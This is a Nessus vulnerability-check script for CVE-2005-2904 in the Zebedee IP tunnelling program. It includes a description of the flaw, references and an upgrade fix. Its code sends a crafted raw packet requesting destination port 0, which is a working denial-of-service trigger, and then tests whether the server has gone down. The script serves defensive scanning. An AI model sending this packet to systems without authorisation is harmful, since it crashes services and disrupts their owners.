#
# (C) Tenable Network Security
#


if (description) {
  script_id(19606);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2904");
  script_bugtraq_id(14796);

  name["english"] = "Zebedee Target Port 0 Denial of Service Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote host contains a IP tunnelling programming that is prone to
denial of service attacks. 

Description :

The remote host is running Zebedee, an open-source IP tunneling
program for Linux, unix, and Windows. 

The version of Zebedee installed on the remote host is prone to denial
of service attacks.  Specifically, the server will crash if it
receives a request for a connection with a destination port of 0.  By
exploiting this flaw, an attacker could cause the affected application
to fail to respond to further requests. 

See also :

http://www.securityfocus.com/archive/1/410157/30/0/threaded
http://sourceforge.net/mailarchive/forum.php?thread_id=8134987&forum_id=2055

Solution : 

Upgrade to Zebedee 2.4.1A / 2.5.3 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:A)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for target port 0 denial of service vulnerability in Zebedee";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 
  script_require_ports("Services/unknown", 11965);

  exit(0);
}


include("misc_func.inc");

if (thorough_tests) {
  port = get_unknown_svc(11965);
  if (!port) exit(0);
}
else port = 11965;
if (!get_port_state(port)) exit(0);


# Try to crash the server.
soc = open_sock_tcp(port);
if (!soc) exit(0);
send(
  socket:soc,
  data:raw_string(
    0x02, 0x01,                                      # protocol version
    0x00, 0x00,                                      # flags
    0x20, 0x00,                                      # max message size
    0x00, 0x06,                                      # compression info
    0x00, 0x00,                                      # port request: value = 0x0
    0x00, 0x80,                                      # key length
    0xff, 0xff, 0xff, 0xff,                          # key token
    0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74,  # nonce value
    0x00, 0x00, 0x00, 0x00                           # target host address
  )
);
close(soc);


# There's a problem if it's down.
sleep(3);
soc2 = open_sock_tcp(port);
if (!soc2) security_warning(port);
